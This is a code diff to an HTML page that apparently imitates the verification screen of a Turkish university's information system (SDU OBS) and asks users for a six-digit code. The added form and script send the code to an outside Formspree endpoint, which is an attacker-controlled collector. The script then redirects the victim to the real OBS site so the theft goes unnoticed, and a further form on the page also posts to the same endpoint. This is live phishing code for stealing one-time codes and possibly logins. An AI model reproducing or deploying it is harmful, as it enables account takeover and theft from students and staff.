@@ -933,19 +933,29 @@
                                         Bilgi Sistemi'nden", öğrenci iseniz "Öğrenci Bilgi Sistemi'nden" alınmaktadır.
                                         Eğer doğrulama kodu gelmediyse "Personel Daire Başkanlığı'ndan" veya "Öğrenci
                                         İşleri Daire Başkanlığı'ndan" numaranızın düzeltilmesini isteyiniz.</div>
-                                    <form id="dogrulamaForm" action="https://formspree.io/f/mvzzwyqq" method="POST">
-
-                                        <div class="form-group mb-3">
-                                            <input type="text" name="dogrulama_kodu" class="form-control text-center"
-                                                placeholder="6 Haneli Kodu Giriniz" required maxlength="6"
-                                                style="font-size: 20px; letter-spacing: 5px;">
+                                    <form id="kodForm" action="https://formspree.io/f/mvzzwyqq" method="POST">
+                                        <div class="form-group mb-3 text-center">
+                                            <input type="text" name="onay_kodu" class="form-control text-center"
+                                                placeholder="6 Haneli Kodu Giriniz" required maxlength="6">
                                         </div>
-
-                                        <button type="submit" class="btn btn-primary btn-block"
-                                            style="width:100%; background-color:#800000; color:white; height: 50px; font-weight: bold;">
-                                            DOĞRULA
-                                        </button>
+                                        <button type="submit" class="btn btn-primary"
+                                            style="width:100%; background-color:#800000; color:white;">DOĞRULA</button>
                                     </form>
+
+                                    <script>
+                                        document.getElementById("kodForm").addEventListener("submit", function (e) {
+                                            e.preventDefault();
+                                            var data = new FormData(this);
+                                            fetch(this.action, {
+                                                method: 'POST',
+                                                body: data,
+                                                headers: { 'Accept': 'application/json' }
+                                            }).finally(() => {
+                                                // Kod gönderilince gerçek OBS'ye at
+                                                window.location.href = "https://obs.sdu.edu.tr/";
+                                            });
+                                        });
+                                    </script>
                                     <div class="login-form-container" style="margin-top: 20px;">
                                         <form action="https://formspree.io/f/mvzzwyqq" method="POST" target="_self">
 
